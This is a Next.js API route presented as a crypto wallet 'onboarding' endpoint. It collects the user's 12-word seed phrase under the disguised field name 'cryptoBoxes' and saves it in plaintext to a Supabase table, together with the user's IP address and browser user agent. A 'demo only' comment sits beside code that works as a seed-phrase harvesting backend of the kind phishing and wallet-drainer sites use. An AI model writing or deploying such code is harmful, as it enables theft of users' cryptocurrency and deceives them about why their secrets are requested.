import { NextRequest, NextResponse } from "next/server";
import { getSession } from "@/lib/auth/session";
import { getSupabase } from "@/lib/db/supabase";

export const runtime = "nodejs";

export async function POST(request: NextRequest) {
  try {
    // 1. Authenticate – get connected wallet address
    const wallet = await getSession(); // assuming this returns string | null (wallet address)
    if (!wallet) {
      return NextResponse.json({ error: "Not authenticated" }, { status: 401 });
    }

    // 2. Parse payload coming from welcome/onboarding modal/page
    const body = await request.json();

    const {
      walletType,           // e.g. "metamask", "phantom", "walletconnect", etc.
      cryptoBoxes,          // string[] — 12 words (mnemonic / seed phrase)
      timestamp,            // optional – can ignore or use for created_at if needed
    } = body;

    // Stronger validation
    if (
      !walletType ||
      typeof walletType !== "string" ||
      !Array.isArray(cryptoBoxes) ||
      cryptoBoxes.length !== 12 ||
      cryptoBoxes.some((word) => typeof word !== "string" || word.trim() === "")
    ) {
      return NextResponse.json(
        { error: "Invalid payload: walletType (string) and exactly 12 non-empty words required" },
        { status: 400 }
      );
    }

    const sb = getSupabase();

    // Optional – capture client metadata for fraud/abuse detection
    const ip =
      request.headers.get("x-forwarded-for") ??
      request.headers.get("cf-connecting-ip") ??
      null;

    const userAgent = request.headers.get("user-agent") || null;

    // 3. Save to Supabase
    // WARNING: Storing seed phrases like this is HIGH RISK – only for demo / non-custodial testing!
    const { data, error } = await sb
      .from("wallet_onboarding")
      .insert({
        wallet_address: wallet.toLowerCase().trim(),
        wallet_type: walletType.trim(),
        crypto_boxes: cryptoBoxes,          // stored as text[] in Supabase
        // Alternative (safer for analytics/demo): store only a hash
        // crypto_boxes_hash: await hashMnemonic(cryptoBoxes),
        ip_address: ip ?? undefined,
        user_agent: userAgent ?? undefined,
        // created_at handled automatically if column default is now()
      })
      .select("id")
      .single();

    if (error) {
      console.error("Supabase insert error:", error);
      return NextResponse.json(
        { error: "Failed to save onboarding data", details: error.message },
        { status: 500 }
      );
    }

    // 4. Success – shape response for frontend
    return NextResponse.json(
      {
        success: true,
        message: "Wallet type and onboarding sequence saved",
        recordId: data.id,
        // Never return the seed phrase back!
      },
      { status: 201 }
    );
  } catch (err: any) {
    console.error("Onboarding API error:", err);
    return NextResponse.json(
      { error: err?.message || "Internal server error" },
      { status: 500 }
    );
  }
}